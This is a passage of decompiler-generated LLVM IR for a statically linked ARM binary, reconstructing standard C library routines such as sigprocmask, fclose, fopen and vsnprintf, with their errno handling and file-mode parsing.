  %v2_f9a8 = phi i32 [ %v3_f97c, %entry ], [ %v2_f9a8.pre, %dec_label_pc_f994 ]
  %v0_f9a4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f994 ]
  store i32 %v2_f9a8, i32* @r4, align 4
  ret i32 %v0_f9a4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9a4, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9ac = load i32, i32* @r4, align 4
  store i32 %v3_f9ac, i32* %stack_var_-8, align 4
  %v0_f9b0 = call i32 @setsid()
  store i32 %v0_f9b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f9b0, -4095
  br i1 %tmp, label %dec_label_pc_f9d0, label %dec_label_pc_f9c0

dec_label_pc_f9c0:                                ; preds = %entry
  %v0_f9c0 = call i32 @__errno_location()
  %v0_f9c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f9c4 = sub i32 0, %v0_f9c4
  %v2_f9c8 = inttoptr i32 %v0_f9c0 to i32*
  store i32 %v1_f9c4, i32* %v2_f9c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f9d0

dec_label_pc_f9d0:                                ; preds = %entry, %dec_label_pc_f9c0
  %v0_f9d0 = phi i32 [ %v0_f9b0, %entry ], [ -1, %dec_label_pc_f9c0 ]
  %v2_f9d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f9d4, i32* @r4, align 4
  ret i32 %v0_f9d0

; uselistorder directives
  uselistorder i32 %v0_f9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9d0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9d8 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_f9d8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_f9e05 = load i32, i32* @r4, align 4
  store i32 %v3_f9e05, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa00

bb:                                               ; preds = %entry
  %v3_f9e0 = load i32, i32* @r4, align 4
  store i32 %v3_f9e0, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_fa00, label %dec_label_pc_f9ec

dec_label_pc_f9ec:                                ; preds = %bb
  %v0_f9ec = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f9f8 = inttoptr i32 %v0_f9ec to i32*
  store i32 22, i32* %v2_f9f8, align 4
  %v0_fa24.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fa24

dec_label_pc_fa00:                                ; preds = %.thread, %bb
  %v7_fa00 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_fa00, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_fa00, -4095
  br i1 %tmp13, label %dec_label_pc_fa20, label %dec_label_pc_fa10

dec_label_pc_fa10:                                ; preds = %dec_label_pc_fa00
  %v0_fa10 = call i32 @__errno_location()
  %v0_fa14 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa14 = sub i32 0, %v0_fa14
  %v2_fa18 = inttoptr i32 %v0_fa10 to i32*
  store i32 %v1_fa14, i32* %v2_fa18, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa20

dec_label_pc_fa20:                                ; preds = %dec_label_pc_fa00, %dec_label_pc_fa10
  %v0_fa20 = phi i32 [ %v7_fa00, %dec_label_pc_fa00 ], [ -1, %dec_label_pc_fa10 ]
  store i32 %v0_fa20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f9ec, %dec_label_pc_fa20
  %v0_fa24 = phi i32 [ %v0_fa24.pre, %dec_label_pc_f9ec ], [ %v0_fa20, %dec_label_pc_fa20 ]
  %v2_fa28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa28, i32* @r4, align 4
  ret i32 %v0_fa24

; uselistorder directives
  uselistorder i32 %v7_fa00, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_fa24, { 1, 0 }
  uselistorder label %dec_label_pc_fa20, { 1, 0 }
  uselistorder label %dec_label_pc_fa00, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa2c = load i32, i32* @r4, align 4
  store i32 %v3_fa2c, i32* %stack_var_-8, align 4
  %v2_fa30 = call i32 @time(i32* %arg1)
  store i32 %v2_fa30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_fa30, -4095
  br i1 %tmp, label %dec_label_pc_fa50, label %dec_label_pc_fa40

dec_label_pc_fa40:                                ; preds = %entry
  %v0_fa40 = call i32 @__errno_location()
  %v0_fa44 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa44 = sub i32 0, %v0_fa44
  %v2_fa48 = inttoptr i32 %v0_fa40 to i32*
  store i32 %v1_fa44, i32* %v2_fa48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa50

dec_label_pc_fa50:                                ; preds = %entry, %dec_label_pc_fa40
  %v0_fa50 = phi i32 [ %v2_fa30, %entry ], [ -1, %dec_label_pc_fa40 ]
  %v2_fa54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa54, i32* @r4, align 4
  ret i32 %v0_fa50

; uselistorder directives
  uselistorder i32 %v2_fa30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa50, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_fa5c = call i32 @wait4()
  ret i32 %v0_fa5c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa60 = load i32, i32* @r4, align 4
  store i32 %v3_fa60, i32* %stack_var_-8, align 4
  %v3_fa64 = load i32, i32* @r2, align 4
  %v4_fa64 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_fa64)
  store i32 %v4_fa64, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_fa64, -4095
  br i1 %tmp, label %dec_label_pc_fa84, label %dec_label_pc_fa74

dec_label_pc_fa74:                                ; preds = %entry
  %v0_fa74 = call i32 @__errno_location()
  %v0_fa78 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa78 = sub i32 0, %v0_fa78
  %v2_fa7c = inttoptr i32 %v0_fa74 to i32*
  store i32 %v1_fa78, i32* %v2_fa7c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa84

dec_label_pc_fa84:                                ; preds = %entry, %dec_label_pc_fa74
  %v0_fa84 = phi i32 [ %v4_fa64, %entry ], [ -1, %dec_label_pc_fa74 ]
  %v2_fa88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa88, i32* @r4, align 4
  ret i32 %v0_fa84

; uselistorder directives
  uselistorder i32 %v4_fa64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa84, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fa90 = load i32, i32* @global_var_224e8, align 4
  %v3_fa94 = mul i32 %arg1, 2
  %v4_fa94 = add i32 %v2_fa90, %v3_fa94
  %v5_fa94 = inttoptr i32 %v4_fa94 to i8*
  %v6_fa94 = load i8, i8* %v5_fa94, align 1
  %v8_fa94 = zext i8 %v6_fa94 to i32
  %v1_fa98 = and i32 %v8_fa94, 32
  ret i32 %v1_fa98
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_faac = icmp slt i32 %arg1, 0
  br i1 %v1_faac, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_faac = mul i32 %arg1, 2
  %v2_fab8 = load i32, i32* @global_var_224f0, align 4
  %v2_fabc = add i32 %v2_fab8, %v2_faac
  %v3_fac0 = inttoptr i32 %v2_fabc to i8*
  %v4_fac0 = load i8, i8* %v3_fac0, align 1
  %v6_fac0 = zext i8 %v4_fac0 to i32
  %v1_fac4 = add i32 %v2_fabc, 1
  %v2_fac4 = inttoptr i32 %v1_fac4 to i8*
  %v3_fac4 = load i8, i8* %v2_fac4, align 1
  %v4_fac4 = zext i8 %v3_fac4 to i32
  %v3_fac8 = mul nuw i32 %v4_fac4, 16777216
  %v4_facc = sdiv i32 %v3_fac8, 65536
  %v5_facc = or i32 %v4_facc, %v6_fac0
  ret i32 %v5_facc

; uselistorder directives
  uselistorder i32 %v2_fabc, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_28abc.303 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_fae4 = load i32, i32* @r4, align 4
  store i32 %v3_fae4, i32* %stack_var_-32, align 4
  %v6_fae4 = load i32, i32* @r5, align 4
  %v9_fae4 = load i32, i32* @r6, align 4
  %v12_fae4 = load i32, i32* @r7, align 4
  %v15_fae4 = load i32, i32* @r8, align 4
  %v2_fae8 = add i32 %tmp, 52
  %v3_fae8 = inttoptr i32 %v2_fae8 to i32*
  %v4_fae8 = load i32, i32* %v3_fae8, align 4
  store i32 %v4_fae8, i32* @r8, align 4
  %v2_faec = add i32 %tmp, 56
  store i32 %v2_faec, i32* @r5, align 4
  %v2_faf0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_faf4 = icmp eq i32 %v4_fae8, 0
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_fb04 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_fb04, i32* @r0, align 4
  br i1 %v2_faf4, label %dec_label_pc_fb0c, label %dec_label_pc_fb28

dec_label_pc_fb0c:                                ; preds = %entry
  store i32 79548, i32* %r3.global-to-local, align 4
  %v1_fb14 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  %v1_fb24 = call i32 @__pthread_return_0()
  %v0_fb28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %entry, %dec_label_pc_fb0c
  %v0_fb30 = phi i32 [ %tmp, %entry ], [ %v0_fb28.pre, %dec_label_pc_fb0c ]
  %v1_fb28 = inttoptr i32 %v0_fb30 to i8*
  %v2_fb28 = load i8, i8* %v1_fb28, align 1
  %v3_fb28 = zext i8 %v2_fb28 to i32
  %v1_fb2c = and i32 %v3_fb28, 64
  store i32 %v1_fb2c, i32* %r3.global-to-local, align 4
  %v2_fb2c = icmp eq i32 %v1_fb2c, 0
  store i1 %v2_fb2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fb2c, i32* @r7, align 4
  br i1 %v2_fb2c, label %dec_label_pc_fb44, label %dec_label_pc_fb3c

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_fb28
  %v3_fb3c = call i32 @fflush_unlocked(i8* %v1_fb28)
  store i32 %v3_fb3c, i32* @r7, align 4
  %v0_fb44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fb28, %dec_label_pc_fb3c
  %v0_fb44 = phi i32 [ %v0_fb30, %dec_label_pc_fb28 ], [ %v0_fb44.pre, %dec_label_pc_fb3c ]
  %v1_fb44 = add i32 %v0_fb44, 4
  %v2_fb44 = inttoptr i32 %v1_fb44 to i32*
  %v3_fb44 = load i32, i32* %v2_fb44, align 4
  %v1_fb48 = call i32 @__libc_close(i32 %v3_fb44)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fb50 = icmp slt i32 %v1_fb48, 0
  %v2_fb50 = icmp eq i32 %v1_fb48, 0
  store i1 %v2_fb50, i1* %cpsr_z.global-to-local, align 1
  %v1_fb54 = load i32, i32* @r4, align 4
  %v2_fb54 = add i32 %v1_fb54, 4
  %v3_fb54 = inttoptr i32 %v2_fb54 to i32*
  store i32 -1, i32* %v3_fb54, align 4
  store i32 %v2_faf0, i32* @r0, align 4
  br i1 %v1_fb50, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_fb44
  %v3_fb68 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_fb68, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_fb44, %bb
  %v1_fb74 = call i32 @__pthread_return_void()
  %v1_fb80 = call i32 @__pthread_return_0()
  %v2_fb88 = load i32, i32* @global_var_26888.311, align 4
  %v1_fb8c = add i32 %v2_fb88, 1
  store i32 %v1_fb8c, i32* %r3.global-to-local, align 4
  store i32 %v1_fb8c, i32* @global_var_26888.311, align 4
  store i32 %v2_faf0, i32* @r0, align 4
  %v1_fba4 = call i32 @__pthread_return_void()
  %v0_fba8 = load i32, i32* @r4, align 4
  %v1_fba8 = inttoptr i32 %v0_fba8 to i32*
  %v2_fba8 = load i32, i32* %v1_fba8, align 4
  %v1_fbac = and i32 %v2_fba8, 24576
  store i32 %v1_fbac, i32* %r3.global-to-local, align 4
  %v3_fbb01 = udiv i32 %v1_fbac, 256
  %v1_fbb4 = trunc i32 %v3_fbb01 to i8
  %v3_fbb4 = add i32 %v0_fba8, 1
  %v4_fbb4 = inttoptr i32 %v3_fbb4 to i8*
  store i8 %v1_fbb4, i8* %v4_fbb4, align 1
  %v0_fbb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fbb8 = trunc i32 %v0_fbb8 to i8
  %v2_fbb8 = load i32, i32* @r4, align 4
  %v3_fbb8 = inttoptr i32 %v2_fbb8 to i8*
  store i8 %v1_fbb8, i8* %v3_fbb8, align 1
  %v0_fbbc = load i32, i32* @r4, align 4
  %v1_fbbc = inttoptr i32 %v0_fbbc to i32*
  %v2_fbbc = load i32, i32* %v1_fbbc, align 4
  %v1_fbc0 = or i32 %v2_fbbc, 48
  store i32 %v1_fbc0, i32* %r3.global-to-local, align 4
  %v3_fbc4 = sdiv i32 %v2_fbbc, 256
  %v0_fbc8 = load i32, i32* @r8, align 4
  %v2_fbc8 = icmp eq i32 %v0_fbc8, 0
  store i1 %v2_fbc8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_fb04, i32* @r0, align 4
  %v1_fbd8 = trunc i32 %v3_fbc4 to i8
  %v3_fbd8 = add i32 %v0_fbbc, 1
  %v4_fbd8 = inttoptr i32 %v3_fbd8 to i8*
  store i8 %v1_fbd8, i8* %v4_fbd8, align 1
  %v0_fbdc = load i32, i32* %r3.global-to-local, align 4
  %v1_fbdc = trunc i32 %v0_fbdc to i8
  %v2_fbdc = load i32, i32* @r4, align 4
  %v3_fbdc = inttoptr i32 %v2_fbdc to i8*
  store i8 %v1_fbdc, i8* %v3_fbdc, align 1
  %v0_fbe0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fbe0, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_fbe4 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_fbe8 = load i32, i32* @r4, align 4
  %v1_fbe8 = add i32 %v0_fbe8, 1
  %v2_fbe8 = inttoptr i32 %v1_fbe8 to i8*
  %v3_fbe8 = load i8, i8* %v2_fbe8, align 1
  %v4_fbe8 = zext i8 %v3_fbe8 to i32
  store i32 %v4_fbe8, i32* %r3.global-to-local, align 4
  %v1_fbec = and i32 %v4_fbe8, 64
  %v2_fbec = icmp eq i32 %v1_fbec, 0
  store i1 %v2_fbec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbec, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_fbf4 = xor i1 %v2_fbec, true
  call void @__pseudo_cond_branch(i1 %v1_fbf4, i32 ptrtoint (i32* @global_var_126e8.313 to i32))
  store i32 %v2_faf0, i32* @r0, align 4
  %v1_fc08 = call i32 @__pthread_return_void()
  %v1_fc14 = call i32 @__pthread_return_0()
  %v2_fc1c = load i32, i32* @global_var_2688c.316, align 4
  %v1_fc20 = add i32 %v2_fc1c, 1
  store i32 %v1_fc20, i32* %r3.global-to-local, align 4
  store i32 %v2_faf0, i32* @r0, align 4
  store i32 %v1_fc20, i32* @global_var_2688c.316, align 4
  %v1_fc34 = call i32 @__pthread_return_void()
  %v1_fc38 = call i32 @_stdio_openlist_dec_use(i32 %v1_fc34)
  %v0_fc3c = load i32, i32* @r7, align 4
  %v2_fc44 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fc44, i32* @r4, align 4
  store i32 %v6_fae4, i32* @r5, align 4
  store i32 %v9_fae4, i32* @r6, align 4
  store i32 %v12_fae4, i32* @r7, align 4
  store i32 %v15_fae4, i32* @r8, align 4
  ret i32 %v0_fc3c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_fb44, { 1, 0 }
  uselistorder label %dec_label_pc_fb28, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fc6c = call i32 @_stdio_fopen()
  ret i32 %v0_fc6c
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_fc7c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_fc7c, i32* @ip, align 4
  store i32 %v2_fc7c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_fc90 = call i32 @__GI_vsnprintf()
  ret i32 %v0_fc90

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_fca4 = load i32, i32* @r4, align 4
  %v6_fca4 = load i32, i32* @r5, align 4
  %v12_fca4 = load i32, i32* @r7, align 4
  %v15_fca4 = load i32, i32* @r8, align 4
  %v18_fca4 = load i32, i32* @sl, align 4
  %v0_fca8 = load i32, i32* @r3, align 4
  store i32 %v0_fca8, i32* @r8, align 4
  %v2_fcac = ptrtoint i32* %stack_var_-108 to i32
  %v0_fcb4 = load i32, i32* @r0, align 4
  %v1_fcb4 = sub i32 -1, %v0_fcb4
  store i32 %v1_fcb4, i32* @r5, align 4
  store i32 %v0_fcb4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_fcc8 = load i32, i32* @r1, align 4
  %v3_fcc8 = icmp ult i32 %v1_fcb4, %v1_fcc8
  br i1 %v3_fcc8, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_fcc8, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_fcd0 = load i32, i32* @r2, align 4
  store i32 %v0_fcd0, i32* @r7, align 4
  %v2_fcd4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_fcd4, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_fcf0 = call i32 @__stdio_init_mutex()
  %v0_fcf4 = load i32, i32* @r4, align 4
  %v1_fcf4 = load i32, i32* @r5, align 4
  %v2_fcf4 = add i32 %v1_fcf4, %v0_fcf4
  %v0_fcfc = load i32, i32* @r7, align 4
  %v0_fd00 = load i32, i32* @r8, align 4
  %v0_fd0c = load i32, i32* @sl, align 4
  %v12_fd20 = inttoptr i32 %v0_fcfc to i8*
  %v13_fd20 = call i32 @_vfprintf_internal(i32 %v2_fcac, i8* %v12_fd20, i32 %v0_fd00, i32 %v2_fcf4, i32 %v0_fcf4, i32 %v2_fcf4, i32 %v0_fcf4, i32 %v0_fcf4, i32 %v0_fcf4, i32 %v2_fcf4, i32 %v0_fd0c)
  %v0_fd24 = load i32, i32* @r5, align 4
  %v1_fd24 = load i32, i32* @sl, align 4
  %v9_fd24 = icmp eq i32 %v0_fd24, %v1_fd24
  br i1 %v9_fd24, label %dec_label_pc_fd4c, label %dec_label_pc_fd30

dec_label_pc_fd30:                                ; preds = %bb23
  %v9_fd38 = icmp eq i32 %v1_fcf4, 0
  %v1_fd3c = sext i1 %v9_fd38 to i32
  %v1_fd3c.v0_fd04 = add i32 %v0_fcf4, %v1_fd3c
  %stack_var_-92.0 = inttoptr i32 %v1_fd3c.v0_fd04 to i8*
  %v1_fd48 = trunc i32 %v1_fd24 to i8
  store i8 %v1_fd48, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %bb23, %dec_label_pc_fd30
  store i32 %v3_fca4, i32* @r4, align 4
  store i32 %v6_fca4, i32* @r5, align 4
  store i32 %v12_fca4, i32* @r7, align 4
  store i32 %v15_fca4, i32* @r8, align 4
  store i32 %v18_fca4, i32* @sl, align 4
  ret i32 %v13_fd20

; uselistorder directives
  uselistorder i32 %v1_fcf4, { 1, 0 }
  uselistorder i32 %v0_fcf4, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_fcc8, { 1, 0 }
  uselistorder i32 %v0_fcb4, { 1, 0 }
  uselistorder label %dec_label_pc_fd4c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_fd54 = load i32, i32* @r4, align 4
  store i32 %v3_fd54, i32* %stack_var_-24, align 4
  %v6_fd54 = load i32, i32* @r5, align 4
  %v9_fd54 = load i32, i32* @r6, align 4
  %v15_fd54 = load i32, i32* @r8, align 4
  %v0_fd58 = load i32, i32* @r1, align 4
  %v1_fd58 = inttoptr i32 %v0_fd58 to i8*
  %v2_fd58 = load i8, i8* %v1_fd58, align 1
  %v3_fd58 = zext i8 %v2_fd58 to i32
  store i32 %v3_fd58, i32* @ip, align 4
  %v7_fd5c = icmp eq i8 %v2_fd58, 114
  store i1 %v7_fd5c, i1* %cpsr_z.global-to-local, align 1
  %v2_fd60 = ptrtoint i32* %stack_var_-56 to i32
  %v0_fd64 = load i32, i32* @r0, align 4
  store i32 %v0_fd64, i32* @r6, align 4
  %v0_fd68 = load i32, i32* @r2, align 4
  store i32 %v0_fd68, i32* @r8, align 4
  %v0_fd6c = load i32, i32* @r3, align 4
  store i32 %v0_fd6c, i32* @r5, align 4
  br i1 %v7_fd5c, label %dec_label_pc_fdb8, label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %entry
  %v7_fd74 = icmp eq i8 %v2_fd58, 119
  store i1 %v7_fd74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd74, label %bb, label %dec_label_pc_fd80

bb:                                               ; preds = %dec_label_pc_fd74
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_fdbc

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd74
  %v7_fd80 = icmp eq i8 %v2_fd58, 97
  store i1 %v7_fd80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd80, label %bb30, label %dec_label_pc_fd8c

bb30:                                             ; preds = %dec_label_pc_fd80
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_fdbc

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd80, %dec_label_pc_fe44, %dec_label_pc_fe18
  %v0_fd8c = call i32 @__errno_location()
  store i32 %v0_fd8c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_fd94 = load i32, i32* @r8, align 4
  %v2_fd94 = icmp eq i32 %v0_fd94, 0
  store i1 %v2_fd94, i1* %cpsr_z.global-to-local, align 1
  %v2_fd98 = inttoptr i32 %v0_fd8c to i32*
  store i32 22, i32* %v2_fd98, align 4
  br i1 %v2_fd94, label %dec_label_pc_1000c, label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %dec_label_pc_fe68._crit_edge, %dec_label_pc_fd8c
  %v0_fda0 = load i32, i32* @r8, align 4
  %v1_fda0 = add i32 %v0_fda0, 1
  %v2_fda0 = inttoptr i32 %v1_fda0 to i8*
  %v3_fda0 = load i8, i8* %v2_fda0, align 1
  %v4_fda0 = zext i8 %v3_fda0 to i32
  store i32 %v4_fda0, i32* %r3.global-to-local, align 4
  %v1_fda4 = and i32 %v4_fda0, 32
  %v2_fda4 = icmp eq i32 %v1_fda4, 0
  store i1 %v2_fda4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fda4, label %dec_label_pc_1000c, label %dec_label_pc_fdac

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fda0
  store i32 %v0_fda0, i32* @r0, align 4
  %v0_fdb0 = call i32 @free()
  store i32 %v0_fdb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000c

dec_label_pc_fdb8:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fdbc

dec_label_pc_fdbc:                                ; preds = %bb, %bb30, %dec_label_pc_fdb8
  %v1_fdd4 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_fdb8 ]
  %v1_fdbc = add i32 %v0_fd58, 1
  %v2_fdbc = inttoptr i32 %v1_fdbc to i8*
  %v3_fdbc = load i8, i8* %v2_fdbc, align 1
  %v7_fdc0 = icmp eq i8 %v3_fdbc, 98
  store i1 %v7_fdc0, i1* %cpsr_z.global-to-local, align 1
  %v1_fdbc.v0_fd58 = select i1 %v7_fdc0, i32 %v1_fdbc, i32 %v0_fd58
  store i32 %v1_fdbc.v0_fd58, i32* %r3.global-to-local, align 4
  %v1_fdcc = add i32 %v1_fdbc.v0_fd58, 1
  %v2_fdcc = inttoptr i32 %v1_fdcc to i8*
  %v3_fdcc = load i8, i8* %v2_fdcc, align 1
  %v4_fdcc = zext i8 %v3_fdcc to i32
  store i32 %v4_fdcc, i32* %r3.global-to-local, align 4
  %v7_fdd0 = icmp eq i8 %v3_fdcc, 43
  store i1 %v7_fdd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdd0, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_fdbc
  store i32 %v1_fdd4, i32* %r3.global-to-local, align 4
  %v2_fdd8 = add nuw nsw i32 %v1_fdd4, 1
  store i32 %v2_fdd8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_fdbc, %bb33
  %v2_fddc = icmp eq i32 %v0_fd68, 0
  store i1 %v2_fddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fddc, label %dec_label_pc_fde4, label %dec_label_pc_fe10

dec_label_pc_fde4:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_fde8 = call i32 @malloc(i32 80)
  store i32 %v1_fde8, i32* %r0.global-to-local, align 4
  store i32 %v1_fde8, i32* @r8, align 4
  %v3_fdec = icmp eq i32 %v1_fde8, 0
  store i1 %v3_fdec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fdec, label %dec_label_pc_10010, label %dec_label_pc_fdf4

dec_label_pc_fdf4:                                ; preds = %dec_label_pc_fde4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_fdfc = add i32 %v1_fde8, 1
  %v4_fdfc = inttoptr i32 %v3_fdfc to i8*
  store i8 32, i8* %v4_fdfc, align 1
  %v0_fe00 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe00 = load i32, i32* @r8, align 4
  %v2_fe00 = add i32 %v1_fe00, 8
  %v3_fe00 = inttoptr i32 %v2_fe00 to i32*
  store i32 %v0_fe00, i32* %v3_fe00, align 4
  %v0_fe04 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe04 = trunc i32 %v0_fe04 to i8
  %v2_fe04 = load i32, i32* @r8, align 4
  %v3_fe04 = inttoptr i32 %v2_fe04 to i8*
